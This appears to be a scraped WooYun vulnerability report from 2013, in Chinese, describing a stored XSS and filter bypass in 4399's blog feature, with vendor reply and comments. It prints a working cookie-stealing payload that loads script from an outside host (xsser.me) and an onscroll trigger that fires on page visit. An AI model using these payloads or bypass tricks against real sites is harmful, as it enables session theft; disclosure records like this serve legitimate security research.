{"id": 14087, "wybug_id": "wooyun-2013-017858", "wybug_title": "4399储存型xss，过滤器绕过", "wybug_corp": "4399小游戏", "wybug_author": "px1624", "wybug_date": "2013-01-25 12:17", "wybug_open_date": "2013-03-11 12:18", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-01-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-02-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-02-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-02-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-03-11：\t细节向公众公开  简要描述： 4399某功能处可以xss，有过滤器过滤，但是可以通过一些手段进行绕过。 详细说明：  1 测试地址\nhttp://my.4399.com/space-693256254-do-blog-id-1140804.html\n请在确认后漏洞后删掉此地址内容。2 4399日志处可以构成xss，此处的过滤器传了个图，插了写代码进去，发现会将on expression \\ 等过滤成.3 经过测试发现，这里应该是对<img>标签的每个属性进行正则，只要发现就进行过滤，但是一个字符串只是过滤最前面的一个特殊字符。就是说onload onload===》.load .load   ononload===》.onload4 所以直接构造onload为on/onload即可绕过5 不过在测试时候发现，虽然可以插进去，F12查看也正常，但是没有执行。<img>的onload onerror之类的貌似都会重新判断一次。比如\n//伪代码if(图片尺寸>50){\timg.onload=\"xxx\"}\n所以就又试着插了些别的代码，比如input、iframe等，6 测试之后发现这里貌似只能插入<div> <img> <a> <font> <p>等几个标签，看来是做了白名单了所以就用onmouseover7 插一个大点的<img> <div> 效果也蛮不错诶，基本上进去就会触发了。（图中的红色边框是div的区域，为了让大家看的更加之观点）图1\n\n8 插入的代码，以及F12中看到成功插入图2 图3\n\n\n\n9 插入了下盗取cookie的代码，并成功盗取cookie登录将onmouseover写为on/onmouseover，会过滤成为. onmouseover插入成功后的盗取cookie的代码,用F12那里复制出来如下（这里要注意对script进行下转换，不然script会被过滤成.）\n<div style=\"border:5px solid red;\" .=\"\" onmouseover=\"s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src='http://xsser.me/4310VB?'+Math.random();document.body.appendChild(s)\"><img src=\"http://p.img4399.com/82248039/3\" .=\"\" onmouseover=\"alert(2)\"></div>\n图4\n\n10 这里<div>也可以插入以下代码直接访问就触发xss<div id=\"xx\" onscroll=\"alert(1);\" style=\"height:30px;overflow-y:auto;width:100px;\">a b c a b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b c<a name=\"t\">d</a></div>div 当滚动条滚动的时候触发div里面的内容是为了让div出现滚动条，name=\"t\"那个是为了让可以直接定位到那里使滚动条滚动利用地址后面要http://xxx.html#t要加上#t 才会直接到<a>标签name处触发onscroll11 至于给管理员通过意见反馈、私信等途径，发链接去xss管理员cookie和后台地址这些事情我就不干了。   漏洞证明：  看上面描述。   修复方案：  过滤、、会不会忽略、、有么有礼物、、   版权声明：转载请注明来源 px1624@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-01-25 16:36 厂商回复： 非常感谢你提供的信息，已提交给相关部门处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-01-25 17:07 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @4399小游戏 之前看别人发的反射型都有8rank、、、写了这么多才给了5rank。诶，情何以堪    \n     2013-02-24 17:34 |    \t\tSevck \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 一个乌云RANK为0的脚本小子)\t\t \n  木有礼物。。。。    \n     2013-03-11 14:05 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @4399小游戏  这什么意思诶？？啥都没给啊。。标题：\t时间：2013-02-19 16:38系统 To px1624 厂商 4399小游戏 向你索取联系方式发送礼物 \t你好你发布的漏洞 4399储存型xss，过滤器绕过 被厂商 4399小游戏 确认，因为此厂商希望获得你的联系方式以便发送小礼物。是否接受并发送联系方式给此厂商? 接受WooYun|自由平等的漏洞和安全信息报告平台    \n     2013-03-11 15:44 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  @px1624 个人信息泄露了吧？    \n     2013-03-11 16:36 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @Passer_by 啥个人信息泄漏？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}